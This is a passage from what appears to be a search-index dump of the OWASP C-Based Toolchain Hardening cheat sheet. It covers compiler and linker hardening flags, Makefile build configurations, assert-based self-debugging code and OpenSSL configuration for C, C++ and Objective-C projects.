linker will produce code which takes advantage of platform security features offered by the kernel and PaX, such as no-exec stacks and heaps (NX) and Position Independent Executable (PIE). The table below offers a set of compiler options to build your program. Static analysis warnings help catch mistakes early, while the linker options harden the executable at runtime. In the table below, \"GCC\" should be loosely taken as \"non-ancient distributions.\" While the GCC team considers 4.2 ancient, you will still encounter it on Apple and BSD platforms due to changes in GPL licensing around 2007. Refer to GCC Option Summary , Options to Request or Suppress Warnings and Binutils (LD) Command Line Options for usage details. Noteworthy of special mention are -fno-strict-overflow and -fwrapv \u2090. The flags ensure the compiler does not remove statements that result in overflow or wrap. If your program only runs correctly using the flags, it is likely violating C/C++ rules on overflow and illegal. If the program is illegal due to overflow or wrap checking, you should consider using safe-iop for C or David LeBlanc's SafeInt in C++. For a project compiled and linked with hardened settings, some of those settings can be verified with the Checksec tool written by Tobias Klein. The checksec.sh script is designed to test standard Linux OS and PaX security features being used by an application. See the Trapkit web page for details. GCC C Warning Options table: AddressSanitizer ThreadSanitizer a) Unlike Clang and -Weverything, GCC does not provide a switch to truly enable all warnings. b) -fstack-protector guards functions with high risk objects such as C strings, while -fstack-protector-all guards all objects. Additional C++ warnings which can be used include the following in Table 3. See GCC's Options Controlling C++ Dialect for additional options and details. GCC C++ Warning Options table: Effective C++, Second Edition book . And additional Objective C warnings which are often useful include the following. See Options Controlling Objective-C and Objective-C++ Dialects for additional options and details. GCC Objective C Warning Options table: The use of aggressive warnings will produce spurious noise. The noise is a tradeoff - you can learn of potential problems at the cost of wading through some chaff. The following will help reduces spurious noise from the warning system: -Wno-unused-parameter (GCC) -Wno-type-limits (GCC 4.3) -Wno-tautological-compare (Clang) Finally, a simple version based Makefile example is shown below. This is different than feature based makefile produced by auto tools (which will test for a particular feature and then define a symbol or configure a template file). Not all platforms use all options and flags. To address the issue you can pursue one of two strategies. First, you can ship with a weakened posture by servicing the lowest common denominator; or you can ship with everything in force. In the latter case, those who don't have a feature available will edit the makefile to accommodate their installation. CXX = g++ EGREP = egrep \u2026 GCC_COMPILER = $( shell $( CXX ) -v 2 > & 1 | $( EGREP ) -i -c '^gcc version' ) GCC41_OR_LATER = $( shell $( CXX ) -v 2 > & 1 | $( EGREP ) -i -c '^gcc version (4\\.[1-9]|[5-9])' ) \u2026 GNU_LD210_OR_LATER = $( shell $( LD ) -v 2 > & 1 | $( EGREP ) -i -c '^gnu ld .* (2\\.1[0-9]|2\\.[2-9])' ) GNU_LD214_OR_LATER = $( shell $( LD ) -v 2 > & 1 | $( EGREP ) -i -c '^gnu ld .* (2\\.1[4-9]|2\\.[2-9])' ) \u2026 ifeq ( $( GCC_COMPILER ) ,1 ) MY_CC_FLAGS += -Wall -Wextra -Wconversion MY_CC_FLAGS += -Wformat = 2 -Wformat-security MY_CC_FLAGS += -Wno-unused-parameter endif ifeq ( $( GCC41_OR_LATER ) ,1 ) MY_CC_FLAGS += -fstack-protector-all endif ifeq ( $( GCC42_OR_LATER ) ,1 ) MY_CC_FLAGS += -Wstrict-overflow endif ifeq ( $( GCC43_OR_LATER ) ,1 ) MY_CC_FLAGS += -Wtrampolines endif ifeq ( $( GNU_LD210_OR_LATER ) ,1 ) MY_LD_FLAGS += -z,nodlopen -z,nodump endif ifeq ( $( GNU_LD214_OR_LATER ) ,1 ) MY_LD_FLAGS += -z,noexecstack -z,noexecheap endif ifeq ( $( GNU_LD215_OR_LATER ) ,1 ) MY_LD_FLAGS += -z,relro -z,now endif ifeq ( $( GNU_LD216_OR_LATER ) ,1 ) MY_CC_FLAGS += -fPIE MY_LD_FLAGS += -pie endif ## Use 'override' to honor the user's command line override CFLAGS : = $( MY_CC_FLAGS ) $( CFLAGS ) override CXXFLAGS : = $( MY_CC_FLAGS ) $( CXXFLAGS ) override LDFLAGS : = $( MY_LD_FLAGS ) $( LDFLAGS ) \u2026 Clang/Xcode \u00b6 Clang and LLVM have been aggressively developed since Apple lost its GPL compiler back in 2007 (due to Tivoization which resulted in GPLv3). Since that time, a number of developers and Goggle have joined the effort. While Clang will consume most (all?) GCC/Binutil flags and switches, the project supports a number of its own options, including a static analyzer. In addition, Clang is relatively easy to build with additional diagnostics, such as Dr. John Regher and Peng Li's Integer Overflow Checker (IOC) . IOC is incredibly useful, and has found bugs in a number of projects, from the Linux Kernel ( include/linux/bitops.h , still unfixed), SQLite, PHP, Firefox (many still unfixed), LLVM, and Python. Future version of Clang (Clang 3.3 and above) will allow you to enable the checks out of the box with -fsanitize=integer and -fsanitize=shift . Clang options can be found at Clang Compiler User's Manual . Clang does include an option to turn on all warnings - -Weverything . Use it with care but use it regularly since you will get back a lot of noise and issues you missed. For example, add -Weverything for production builds and make non-spurious issues a quality gate. Under Xcode, simply add -Weverything to CFLAGS and CXXFLAGS . In addition to compiler warnings, both static analysis and additional security checks can be performed. Reading on Clang's static analysis capabilities can be found at Clang Static Analyzer . Figure 1 below shows some of the security checks utilized by Xcode. Visual Studio \u00b6 Visual Studio offers a convenient Integrated Development Environment (IDE) for managing solutions and their settings. the section called \"Visual Studio Options\" discusses option which should be used with Visual Studio, and the section called \"Project Properties\" demonstrates incorporating those options into a solution's project. The table below lists the compiler and linker switches which should be used under Visual Studio. Refer to Howard and LeBlanc's Writing Secure Code (Microsoft Press) for a detailed discussion; or Protecting Your Code with Visual C++ Defenses in Security Briefs by Michael Howard. In the table below, \"Visual Studio\" refers to nearly all versions of the development environment, including Visual Studio 5.0 and 6.0. For a project compiled and linked with hardened settings, those settings can be verified with BinScope. BinScope is a verification tool from Microsoft that analyzes binaries to ensure that they have been built-in compliance with Microsoft's Security Development Lifecycle (SDLC) requirements and recommendations. See the BinScope Binary Analyzer download page for details. a) See Jon Sturgeon's discussion of the switch at Off By Default Compiler Warnings in Visual C++ . a) When using /GS, there are a number of circumstances which affect the inclusion of a security cookie. For example, the guard is not used if there is no buffer in the stack frame, optimizations are disabled, or the function is declared naked or contains inline assembly. b) #pragma strict_gs_check(on) should be used sparingly, but is recommend in high risk situations, such as when a source file parses input from the internet. Warn Suppression \u00b6 From the tables above, a lot of warnings have been enabled to help detect possible programming mistakes. The potential mistakes are detected via compiler which carries around a lot of contextual information during its code analysis phase. At times, you will receive spurious warnings because the compiler is not that smart. Its understandable and even a good thing (how would you like to be out of a job because a program writes its own programs?). At times you will have to learn how to work with the compiler's warning system to suppress warnings. Notice what was not said: turn off the warnings. Suppressing warnings placates the compiler for spurious noise so you can get to the issues that matter (you are separating the wheat from the chaff). This section will offer some hints and point out some potential minefields. First is an unused parameter (for example, argc or argv ). Suppressing unused parameter warnings is especially helpful for C++ and interface programming, where parameters are often unused. For this warning, simply define an \"UNUSED\" macro and warp the parameter: ##define UNUSED_PARAMETER(x) ((void)x) \u2026 int main ( int argc , char * argv []) { UNUSED_PARAMETER ( argc ); UNUSED_PARAMETER ( argv ); \u2026 } A potential minefield lies near \"comparing unsigned and signed\" values, and -Wconversion will catch it for you. This is because C/C++ promotion rules state the signed value will be promoted to an unsigned value and then compared. That means -1 > 1 after promotion! To fix this, you cannot blindly cast - you must first range test the value: int x = GetX (); unsigned int y = GetY (); ASSERT ( x >= 0 ); if ( ! ( x >= 0 )) throw runtime_error ( \"WTF??? X is negative.\" ); if ( static_cast < unsigned int > ( x ) > y ) cout << \"x is greater than y\" << endl ; else cout << \"x is not greater than y\" << endl ; Notice the code above will debug itself - you don't need to set a breakpoint to see if there is a problem with x . Just run the program and wait for it to tell you there is a problem. If there is a problem, the program will snap the debugger (and more importantly, not call a useless abort() as specified by Posix). It beats the snot out of printf that are removed when no longer needed or pollute outputs. Another conversion problem you will encounter conversion between types, and -Wconversion will also catch it for you. The following will always have an opportunity to fail, and should light up like a Christmas tree: struct sockaddr_in addr ; \u2026 addr . sin_port = htons ( atoi ( argv [ 2 ])); The following would probably serve you much better. Notice atoi and fiends are not used because they can silently fail. In addition, the code is instrumented so you don't need to waste a lot of time debugging potential problems: const char * cstr = GetPortString (); ASSERT ( cstr != NULL ); if ( ! ( cstr != NULL )) throw runtime_error ( \"WTF??? Port string is not valid.\" ); istringstream iss ( cstr ); long long t = 0 ; iss >> t ; ASSERT ( ! ( iss . fail ())); if ( iss . fail ()) throw runtime_error ( \"WTF??? Failed to read port.\" ); // Should this be a port above the reserved range ([0-1024] on Unix)? ASSERT ( t > 0 ); if ( ! ( t > 0 )) throw runtime_error ( \"WTF??? Port is too small\" ); ASSERT ( t < static_cast < long long > ( numeric_limits < unsigned int >:: max ())); if ( ! ( t < static_cast < long long > ( numeric_limits < unsigned int >:: max ()))) throw runtime_error ( \"WTF??? Port is too large\" ); // OK to use port unsigned short port = static_cast < unsigned short > ( t ); \u2026 Again, notice the code above will debug itself - you don't need to set a breakpoint to see if there is a problem with port . This code will continue checking conditions, years after being instrumented (assuming to wrote code to read a config file early in the project). There's no need to remove the ASSERT s as with printf since they are silent guardians. Another useful suppression trick is too avoid ignoring return values. Not only is it useful to suppress the warning, its required for correct code. For example, snprint will alert you to truncations through its return value. You should not make them silent truncations by ignoring the warning or casting to void : char path [ PATH_MAX ]; \u2026 int ret = snprintf ( path , sizeof ( path ), \"%s/%s\" , GetDirectory (), GetObjectName ()); ASSERT ( ret != -1 ); ASSERT ( ! ( ret >= sizeof ( path ))); if ( ret == -1 || ret >= sizeof ( path )) throw runtime_error ( \"WTF??? Unable to build full object name\" ); // OK to use path \u2026 The problem is pandemic, and not just boring user land programs. Projects which offer high integrity code, such as SELinux, suffer silent truncations. The following is from an approved SELinux patch even though a comment was made that it suffered silent truncations in its security_compute_create_name function from compute_create.c . 12 int security_compute_create_raw ( security_context_t scon , 13 security_context_t tcon , 14 security_class_t tclass , 15 security_context_t * newcon ) 16 { 17 char path [ PATH_MAX ]; 18 char * buf ; 19 size_t size ; 20 int fd , ret ; 21 22 if ( ! selinux_mnt ) { 23 errno = ENOENT ; 24 return -1 ; 25 } 26 27 snprintf ( path , sizeof path , \"%s/create\" , selinux_mnt ); 28 fd = open ( path , O_RDWR ); Unlike other examples, the above code will not debug itself, and you will have to set breakpoints and trace calls to determine the point of first failure. (And the code above gambles that the truncated file does not exist or is not under an adversary's control by blindly performing the open ). Runtime \u00b6 The previous sections concentrated on setting up your project for success. This section will examine additional hints for running with increased diagnostics and defenses. Not all platforms are created equal - GNU Linux is difficult to impossible to add hardening to a program after compiling and static linking ; while Windows allows post-build hardening through a download. Remember, the goal is to find the point of first failure quickly so you can improve the reliability and security of the code. Xcode \u00b6 Xcode offers additional Code Diagnostics that can help find memory errors and object use problems. Schemes can be managed through Products menu item, Scheme submenu item, and then Edit . From the editor, navigate to the Diagnostics tab. In the figure below, four additional instruments are enabled for the debugging cycle: Scribble guards, Edge guards, Malloc guards, and Zombies. There is one caveat with using some of the guards: Apple only provides them for the simulator, and not a device. In the past, the guards were available for both devices and simulators. Windows \u00b6 Visual Studio offers a number of debugging aides for use during development. The aides are called Managed Debugging Assistants (MDAs) . You can find the MDAs on the Debug menu, then Exceptions submenu. MDAs allow you to tune your debugging experience by, for example, filter exceptions for which the debugger should snap. For more details, see Stephen Toub's Let The CLR Find Bugs For You With Managed Debugging Assistants . Finally, for runtime hardening, Microsoft has a helpful tool called EMET. EMET is the Enhanced Mitigation Experience Toolkit , and allows you to apply runtime hardening to an executable which was built without. Its very useful for utilities and other programs that were built without an SDLC.","title":"C-Based Toolchain Hardening"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#c-based-toolchain-hardening","text":"","title":"C-Based Toolchain Hardening"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#introduction","text":"C-Based Toolchain Hardening is a treatment of project settings that will help you deliver reliable and secure code when using C, C++ and Objective C languages in a number of development environments. This article will examine Microsoft and GCC toolchains for the C, C++ and Objective C languages. It will guide you through the steps you should take to create executables with firmer defensive postures and increased integration with the available platform security. Effectively configuring the toolchain also means your project will enjoy a number of benefits during development, including enhanced warnings and static analysis, and self-debugging code. There are four areas to be examined when hardening the toolchain: configuration, preprocessor, compiler, and linker. Nearly all areas are overlooked or neglected when setting up a project. The neglect appears to be pandemic, and it applies to nearly all projects including Auto-configured projects, Makefile-based, Eclipse-based, Visual Studio-based, and Xcode-based. Its important to address the gaps at configuration and build time because its difficult to impossible to add hardening on a distributed executable after the fact on some platforms. This is a prescriptive article, and it will not debate semantics or speculate on behavior. Some information, such as the C/C++ committee's motivation and pedigree for program diagnostics , NDEBUG , assert , and abort() , appears to be lost like a tale in the Lord of the Rings. As such, the article will specify semantics (for example, the philosophy of 'debug' and 'release' build configurations), assign behaviors (for example, what an assert should do in a 'debug' and 'release' build configurations), and present a position. If you find the posture is too aggressive, then you should back off as required to suite your taste. A secure toolchain is not a silver bullet. It is one piece of an overall strategy in the engineering process to help ensure success. It will compliment existing processes such as static analysis, dynamic analysis, secure coding, negative test suites, and the like. Tools such as Valgrind and Helgrind will still be needed. And a project will still require solid designs and architectures. The OWASP ESAPI C++ project eats its own dog food. Many of the examples you will see in this article come directly from the ESAPI C++ project. Finally, a Cheat Sheet is available for those who desire a terse treatment of the material. Please visit C-Based Toolchain Hardening Cheat Sheet for the abbreviated version.","title":"Introduction"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#wisdom","text":"Code must be correct. It should be secure. It can be efficient. Dr. Jon Bentley : \"If it doesn't have to be correct, I can make it as fast as you'd like it to be\" . Dr. Gary McGraw : \"Thou shalt not rely solely on security features and functions to build secure software as security is an emergent property of the entire system and thus relies on building and integrating all parts properly\" .","title":"Wisdom"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#configuration","text":"Configuration is the first opportunity to configure your project for success. Not only do you have to configure your project to meet reliability and security goals, you must also configure integrated libraries properly. You typically have has three choices. First, you can use auto-configuration utilities if on Linux or Unix. Second, you can write a makefile by hand. This is predominant on Linux, macOS, and Unix, but it applies to Windows as well. Finally, you can use an integrated development environment or IDE.","title":"Configuration"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#build-configurations","text":"At this stage in the process, you should concentrate on configuring for two builds: Debug and Release. Debug will be used for development and include full instrumentation. Release will be configured for production. The difference between the two settings is usually optimization level and debug level . A third build configuration is Test, and its usually a special case of Release. For debug and release builds, the settings are typically diametrically opposed. Debug configurations have no optimizations and full debug information; while Release builds have optimizations and minimal to moderate debug information. In addition, debug code has full assertions and additional library integration, such as mudflaps and malloc guards such as dmalloc . The Test configuration is often a Release configuration that makes everything public for testing and builds a test harness. For example, all member functions public (C++ class) and all interfaces (library or shared object) should be made available for testing. Many Object Oriented purist oppose testing private interfaces, but this is not about object oriented-ness. This ( q.v. ) is about building reliable and secure software. GCC 4.8 introduced an optimization of -Og . Note that it is only an optimization, and still requires a customary debug level via -g .","title":"Build Configurations"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#debug-builds","text":"Debug builds are where developers spend most of their time when vetting problems, so this build should concentrate forces and tools or be a 'force multiplier'. Though many do not realize, debug code is more highly valued than release code because its adorned with additional instrumentation. The debug instrumentation will cause a program to become nearly \"self-debugging\", and help you catch mistakes such as bad parameters, failed API calls, and memory problems. Self-debugging code reduces your time during trouble shooting and debugging. Reducing time under the debugger means you have more time for development and feature requests. If code is checked in without debug instrumentation, it should be fixed by adding instrumentation or rejected. For GCC, optimizations and debug symbolication are controlled through two switches: -O and -g . You should use the following as part of your CFLAGS and CXXFLAGS for a minimal debug session: -O0 -g3 -ggdb -O0 turns off optimizations and -g3 ensures maximum debug information is available. You may need to use -O1 so some analysis is performed. Otherwise, your debug build will be missing a number of warnings not present in release builds. -g3 ensures maximum debugging information is available for the debug session, including symbolic constants and #defines . -ggdb includes extensions to help with a debug session under GDB. For completeness, Jan Krachtovil stated -ggdb currently has no effect in a private email. Release builds should also consider the configuration pair of -mfunction-return=thunk and -mindirect-branch=thunk . These are the \"Reptoline\" fix which is an indirect branch used to thwart speculative execution CPU vulnerabilities such as Spectre and Meltdown. The CPU cannot tell what code to speculatively execute because it is an indirect (as opposed to a direct) branch. This is an extra layer of indirection, like calling a pointer through a pointer. Debug build should also define DEBUG , and ensure NDEBUG is not defined. NDEBUG removes \"program diagnostics\"; and has undesirable behavior and side effects which discussed below in more detail. The defines should be present for all code, and not just the program. You use it for all code (your program and included libraries) because you need to know how they fail too (remember, you take the bug report - not the third party library). In addition, you should use other relevant flags, such as -fno-omit-frame-pointer . Ensuring a frame pointer exists makes it easier to decode stack traces. Since debug builds are not shipped, its OK to leave symbols in the executable. Programs with debug information do not suffer performance hits. See, for example, How does the gcc -g option affect performance? Finally, you should ensure your project includes additional diagnostic libraries, such as dmalloc and Address Sanitizer . A comparison of some memory checking tools can be found at Comparison Of Memory Tools . If you don't include additional diagnostics in debug builds, then you should start using them sinces its OK to find errors you are not looking for.","title":"Debug Builds"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#release-builds","text":"Release builds are what your customer receives. They are meant to be run on production hardware and servers, and they should be reliable, secure, and efficient. A stable release build is the product of the hard work and effort during development. For release builds, you should use the following as part of CFLAGS and CXXFLAGS for release builds: -On -g2 -O n sets optimizations for speed or size (for example, -Os or -O2 ), and -g2 ensure debugging information is created. Debugging information should be stripped and retained in case of symbolication for a crash report from the field. While not desired, debug information can be left in place without a performance penalty. See How does the gcc -g option affect performance? for details. Release builds should also define NDEBUG , and ensure DEBUG is not defined. The time for debugging and diagnostics is over, so users get production code with full optimizations, no \"programming diagnostics\", and other efficiencies. If you can't optimize or your are performing excessive logging, it usually means the program is not ready for production. If you have been relying on an assert and then a subsequent abort() , you have been abusing \"program diagnostics\" since it has no place in production code. If you want a memory dump, create one so users don't have to worry about secrets and other sensitive information being written to the filesystem and emailed in plain text. For Windows, you would use /Od for debug builds; and /Ox , /O2 or /Os for release builds. See Microsoft's /O Options (Optimize Code) for details.","title":"Release Builds"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#test-builds","text":"Test builds are used to provide heuristic validation by way of positive and negative test suites. Under a test configuration, all interfaces are tested to ensure they perform to specification and satisfaction. \"Satisfaction\" is subjective, but it should include no crashing and no trashing of your memory arena, even when faced with negative tests. Because all interfaces are tested (and not just the public ones), your CFLAGS and CXXFLAGS should include: -Dprotected=public -Dprivate=public You should also change __attribute__ ((visibility (\"hidden\"))) to __attribute__ ((visibility (\"default\"))) . Nearly everyone gets a positive test right, so no more needs to be said. The negative self tests are much more interesting, and you should concentrate on trying to make your program fail so you can verify its fails gracefully. Remember, a bad guy is not going to be courteous when he attempts to cause your program to fail. And its your project that takes egg on the face by way of a bug report or guest appearance on Full Disclosure or Bugtraq - not <some library> you included.","title":"Test Builds"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#auto-tools","text":"Auto configuration tools are popular on many Linux and Unix based systems, and the tools include Autoconf , Automake , config , and Configure . The tools work together to produce project files from scripts and template files. After the process completes, your project should be setup and ready to be made with make . When using auto configuration tools, there are a few files of interest worth mentioning. The files are part of the auto tools chain and include m4 and the various *.in , *.ac (autoconf), and *.am (automake) files. At times, you will have to open them, or the resulting makefiles, to tune the \"stock\" configuration. There are three downsides to the command-line configuration tools in the toolchain: (1) they often ignore user requests, (2) they cannot create configurations, and (3) security is often not a goal. To demonstrate the first issue, confider your project with the following: configure CFLAGS=\"-Wall -fPIE\" CXXFLAGS=\"-Wall -fPIE\" LDFLAGS=\"-pie\" . You will probably find the auto tools ignored your request, which means the command below will not produce expected results. As a work around, you will have to open an m4 scripts, Makefile.in or Makefile.am and fix the configuration. $ configure CFLAGS = \"-Wall -Wextra -Wconversion -fPIE -Wno-unused-parameter -Wformat=2 -Wformat-security -fstack-protector-all -Wstrict-overflow\" LDFLAGS = \"-pie -z,noexecstack -z,noexecheap -z,relro -z,now\" For the second point, you will probably be disappointed to learn Automake does not support the concept of configurations . Its not entirely Autoconf's or Automake's fault - Make and its inability to detect changes is the underlying problem. Specifically, Make only checks modification times of prerequisites and targets , and does not check things like CFLAGS and CXXFLAGS . The net effect is you will not receive expected results when you issue make debug and then make test or make release . Finally, you will probably be disappointed to learn tools such as Autoconf and Automake miss many security related opportunities and ship insecure out of the box. There are a number of compiler switches and linker flags that improve the defensive posture of a program, but they are not 'on' by default. Tools like Autoconf - which are supposed to handle this situation - often provides setting to serve the lowest of all denominators. A recent discussion on the Automake mailing list illuminates the issue: Enabling compiler warning flags . Attempts to improve default configurations were met with resistance and no action was taken. The resistance is often of the form, \" <some useful warning> also produces false positives \" or \" <some obscure platform> does not support <established security feature> \". Its noteworthy that David Wheeler, the author of Secure Programming for Linux and Unix HOWTO , was one of the folks trying to improve the posture.","title":"Auto Tools"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#makefiles","text":"Make is one of the earliest build tools dating back to the 1970s. Its available on Linux, macOS and Unix, so you will frequently encounter projects using it. Unfortunately, Make has a number of short comings ( Recursive Make Considered Harmful and What's Wrong With GNU make? ), and can cause some discomfort. Despite issues with Make, ESAPI C++ uses Make primarily for three reasons: first, its omnipresent; second, its easier to manage than the Auto Tools family; and third, libtool was out of the question. Consider what happens when you: (1) type make debug , and then type make release . Each build would require different CFLAGS due to optimizations and level of debug support. In your makefile, you would extract the relevant target and set CFLAGS and CXXFLAGS similar to below (taken from ESAPI C++ Makefile ): ## Makefile DEBUG_GOALS = $(filter $(MAKECMDGOALS), debug) ifneq ($(DEBUG_GOALS),) WANT_DEBUG := 1 WANT_TEST := 0 WANT_RELEASE := 0 endif \u2026 ifeq ($(WANT_DEBUG),1) ESAPI_CFLAGS += -DDEBUG=1 -UNDEBUG -g3 -ggdb -O0 ESAPI_CXXFLAGS += -DDEBUG=1 -UNDEBUG -g3 -ggdb -O0 endif ifeq ($(WANT_RELEASE),1) ESAPI_CFLAGS += -DNDEBUG=1 -UDEBUG -g -O2 ESAPI_CXXFLAGS += -DNDEBUG=1 -UDEBUG -g -O2 endif ifeq ($(WANT_TEST),1) ESAPI_CFLAGS += -DESAPI_NO_ASSERT=1 -g2 -ggdb -O2 -Dprivate=public -Dprotected=public ESAPI_CXXFLAGS += -DESAPI_NO_ASSERT=1 -g2 -ggdb -O2 -Dprivate=public -Dprotected=public endif \u2026 ## Merge ESAPI flags with user supplied flags. We perform the extra step to ensure ## user options follow our options, which should give user option's a preference. override CFLAGS := $(ESAPI_CFLAGS) $(CFLAGS) override CXXFLAGS := $(ESAPI_CXXFLAGS) $(CXXFLAGS) override LDFLAGS := $(ESAPI_LDFLAGS) $(LDFLAGS) \u2026 Make will first build the program in a debug configuration for a session under the debugger using a rule similar to: %.cpp:%.o: $(CXX) $(CPPFLAGS) $(CXXFLAGS) -c $< -o $@ When you want the release build, Make will do nothing because it considers everything up to date despite the fact CFLAGS and CXXFLAGS have changed. Hence, your program will actually be in a debug configuration and risk a SIGABRT at runtime because debug instrumentation is present (recall assert calls abort() when NDEBUG is not defined). In essence, you have DoS'd yourself due to make . In addition, many projects do not honor the user's command-line. ESAPI C++ does its best to ensure a user's flags are honored via override as shown above, but other projects do not. For example, consider a project that should be built with Position Independent Executable (PIE or ASLR) enabled and data execution prevention (DEP) enabled. Dismissing user settings combined with insecure out of the box settings (and not picking them up during auto-setup or auto-configure) means a program built with the following will likely have neither defense: make CFLAGS = \"-fPIE\" CXXFLAGS = \"-fPIE\" LDFLAGS = \"-pie -z,noexecstack, -z,noexecheap\" Defenses such as ASLR and DEP are especially important on Linux because Data Execution - not Prevention - is the norm .","title":"Makefiles"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#integration","text":"Project level integration presents opportunities to harden your program or library with domain specific knowledge. For example, if the platform supports Position Independent Executables (PIE or ASLR) and data execution prevention (DEP), then you should integrate with it. The consequences of not doing so could result in exploitation. As a case in point, see KingCope's 0-days for MySQL in December, 2012 (CVE-2012-5579 and CVE-2012-5612, among others). Integration with platform security would have neutered a number of the 0-days. You also have the opportunity to include helpful libraries that are not need for business logic support. For example, if you are working on a platform with DMalloc or Address Sanitizer , you should probably use it in your debug builds. For Ubuntu, DMalloc available from the package manager and can be installed with sudo apt install libdmalloc5 . For Apple platforms, its available as a scheme option. Address Sanitizer is available in GCC 4.8 and above for many platforms. In addition, project level integration is an opportunity to harden third party libraries you chose to include. Because you chose to include them, you and your users are responsible for them. If you or your users endure a SP800-53 audit, third party libraries will be in scope because the supply chain is included (specifically, item SA-12, Supply Chain Protection). The audits are not limited to those in the US Federal arena - financial institutions perform reviews too. A perfect example of violating this guidance is CVE-2012-1525 , which was due to Adobe's inclusion of a defective Sablotron library . Another example is including OpenSSL. You know (1) SSLv2 is insecure , (2) SSLv3 is insecure , and (3) compression is insecure (among others). In addition, suppose you don't use hardware and engines, and only allow static linking. Given the knowledge and specifications, you would configure the OpenSSL library as follows: $ Configure darwin64-x86_64-cc -no-hw -no-engine -no-comp -no-shared -no-dso -no-ssl2 -no-ssl3 --openssldir = \u2026 Note Well : you might want engines, especially on Ivy Bridge microarchitectures (3rd generation Intel Core i5 and i7 processors). To have OpenSSL use the processor's random number generator (via the of rdrand instruction), you will need to call OpenSSL's ENGINE_load_rdrand() function and then ENGINE_set_default with ENGINE_METHOD_RAND . See OpenSSL's Random Numbers for details. If you configure without the switches, then you will likely have vulnerable code/libraries and risk failing an audit. If the program is a remote server, then the following command will reveal if compression is active on the channel: echo \"GET / HTTP1.0\" | openssl s_client -connect <nowiki>example.com:443</nowiki> nm or openssl s_client will show that compression is enabled in the client. In fact, any symbol within the OPENSSL_NO_COMP preprocessor macro will bear witness since -no-comp is translated into a CFLAGS define. $ nm /usr/local/ssl/iphoneos/lib/libcrypto.a 2 >/dev/null | egrep -i \"(COMP_CTX_new|COMP_CTX_free)\" 0000000000000110 T COMP_CTX_free 0000000000000000 T COMP_CTX_new Even more egregious is the answer given to auditors who specifically ask about configurations and protocols: \"we don't use weak/wounded/broken ciphers\" or \"we follow best practices.\" The use of compression tells the auditor that you are using wounded protocol in an insecure configuration and you don't follow best practices. That will likely set off alarm bells, and ensure the auditor dives deeper on more items.","title":"Integration"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#preprocessor","text":"The preprocessor is crucial to setting up a project for success. The C committee provided one macro - NDEBUG - and the macro can be used to derive a number of configurations and drive engineering processes. Unfortunately, the committee also left many related items to chance, which has resulted in programmers abusing built-in facilities. This section will help you set up you projects to integrate well with other projects and ensure reliability and security. There are three topics to discuss when hardening the preprocessor. The first is well defined configurations which produce well defined behaviors, the second is useful behavior from assert, and the third is proper use of macros when integrating vendor code and third party libraries.","title":"Preprocessor"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#configurations","text":"To remove ambiguity, you should recognize two configurations: Release and Debug. Release is for production code on live servers, and its behavior is requested via the C/C++ NDEBUG macro. Its also the only macro observed by the C and C++ Committees and Posix. Diametrically opposed to release is Debug. While there is a compelling argument for !defined(NDEBUG) , you should have an explicit macro for the configuration and that macro should be DEBUG . This is because vendors and outside libraries use DEBUG (or similar) macro for their configuration. For example, Carnegie Mellon's Mach kernel uses DEBUG , Microsoft's CRT uses _DEBUG , and Wind River Workbench uses DEBUG_MODE . In addition to NDEBUG (Release) and DEBUG (Debug), you have two additional cross products: both are defined or neither are defined. Defining both should be an error, and defining neither should default to a release configuration. Below is from ESAPI C++ EsapiCommon.h , which is the configuration file used by all source files: // Only one or the other, but not both ##if (defined(DEBUG) || defined(_DEBUG)) && (defined(NDEBUG) || defined ( _NDEBUG )) ## error Both DEBUG and NDEBUG are defined. ##endif // The only time we switch to debug is when asked. // NDEBUG or {nothing} results // in release build (fewer surprises at runtime). ##if defined(DEBUG) || defined(_DEBUG) ## define ESAPI_BUILD_DEBUG 1 ##else ## define ESAPI_BUILD_RELEASE 1 ##endif When DEBUG is in effect, your code should receive full debug instrumentation, including the full force of assertions.","title":"Configurations"},{"location":"cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html#assert","text":"Asserts will help you create self-debugging code by helping you find the point of first failure quickly and easily. Asserts should be used throughout your program, including parameter validation, return value checking and program state. The assert will silently guard your code through its lifetime. It will always be there, even when not debugging a specific component of a module. If you have thorough code coverage, you will spend less time debugging and more time developing because programs will debug themselves. To use asserts effectively, you should assert everything. That includes parameters upon entering a function, return values from function calls, and any program state. Everywhere you place an if statement for validation or checking, you should have an assert. Everywhere you have an assert for validation or checking, you should have an if statement. They go hand-in-hand. If you are still using printf 's, then you have an opportunity for improvement. In the time it takes for you to write a printf or NSLog statement, you could have written an assert . Unlike the printf or NSLog which are often removed when no longer needed, the assert stays active forever. Remember, this is all about finding the point of first failure quickly so you can spend your time doing other things. There is one problem with using asserts - Posix states assert should call abort() if NDEBUG is not defined. When debugging, NDEBUG will never be defined since you want the \"program diagnostics\" (quote from the Posix description). The behavior makes assert and its accompanying abort() completely useless for development. The result of \"program diagnostics\" calling abort() due to standard C/C++ behavior is disuse - developers simply don't use them. Its incredibly bad for the development community because self-debugging programs can help eradicate so many stability problems. Since self-debugging programs are so powerful, you will have to have to supply your own assert and signal handler with improved behavior. Your assert will exchange auto-aborting behavior for auto-debugging behavior. The auto-debugging facility will ensure the debugger snaps when a problem is detected, and you will find the point of first failure quickly and easily. ESAPI C++ supplies its own assert with the behavior described above. In the code below, ASSERT raises SIGTRAP when in effect or it evaluates to void in other cases. // A debug assert which should be sprinkled liberally. // This assert fires and then continues rather // than calling abort(). Useful when examining negative // test cases from the command-line. ##if (defined(ESAPI_BUILD_DEBUG) && defined(ESAPI_OS_STARNIX)) ## define ESAPI_ASSERT1(exp) { \\ if(!(exp)) { \\ std::ostringstream oss; \\ oss << \"Assertion failed: \" << (char*)(__FILE__) << \"(\" \\ << (int)__LINE__ << \"): \" << 